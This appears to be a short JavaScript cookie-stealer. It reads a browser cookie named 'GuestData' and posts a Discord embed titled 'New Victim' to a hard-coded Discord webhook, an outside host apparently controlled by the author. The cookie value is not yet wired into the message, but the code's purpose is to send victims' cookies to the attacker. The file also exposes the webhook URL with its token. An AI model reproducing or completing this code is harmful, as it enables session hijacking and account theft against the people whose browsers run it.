function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for(let i = 0; i <ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}
console.log(getCookie("GuestData"));


var myEmbed = {
    author: {
      name: "SkiddDev#2675"
    },
    title: "New Victim",
    description: "Cookies: NULL",
}

function sendMessage() {
    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1021755086558466148/pgqlvz3Iz0JA1OvU5o11iRJnCifWruQ5iFHoMV_JnkJ9KhI8ax5LuevYSYwTAy-V-1kZ");
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
        username: "My Webhook Name",
        avatar_url: "https://cdn.discordapp.com/attachments/1015961172740145182/1021756200133607434/Improved_Valkyrie_Helm.webp",
        embeds: [myEmbed]
    }
    request.send(JSON.stringify(params));
}
sendMessage()
